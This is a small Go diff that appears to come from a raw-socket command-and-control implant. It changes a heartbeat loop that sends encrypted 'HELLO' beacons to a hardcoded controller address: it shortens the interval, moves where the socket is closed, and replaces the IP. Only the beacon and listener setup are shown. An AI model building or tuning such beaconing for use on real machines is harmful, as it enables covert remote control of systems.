@@ -26,7 +26,6 @@ var lastCmdRan string
 func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
 	for {
 		fd := rawsocket.NewSocket()
-		defer unix.Close(fd)
 
 		// Create Cmd -> Encrypt -> Wrap with Identifier
 		data := rawsocket.CreateHello(iface.HardwareAddr, src)
@@ -39,7 +38,8 @@ func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.
 		rawsocket.SendPacket(fd, iface, addr, packet)
 
 		fmt.Println("[+] Sent HELLO")
-		time.Sleep(30 * time.Second)
+		time.Sleep(10 * time.Second)
+		unix.Close(fd)
 	}
 }
 
@@ -99,7 +99,7 @@ func main() {
 	fmt.Println("[+] Socket created")
 
 	// Get information that is needed for networking
-	iface, src := rawsocket.GetOutwardIface("192.168.15.75:8000")
+	iface, src := rawsocket.GetOutwardIface("172.0.0.1:8000")
 
 	dstMAC, err := rawsocket.GetRouterMAC()
 	if err != nil {
@@ -108,7 +108,7 @@ func main() {
 	fmt.Println("[+] DST MAC:", dstMAC.String())
 	fmt.Println("[+] Listening")
 
-	go generateHeartbeat(iface, src, net.IPv4(192, 168, 15, 75), dstMAC)
+	go generateHeartbeat(iface, src, net.IPv4(172, 0, 0, 1), dstMAC)
 
 	for {
 		packet := rawsocket.ReadPacket(readfd, vm, false)
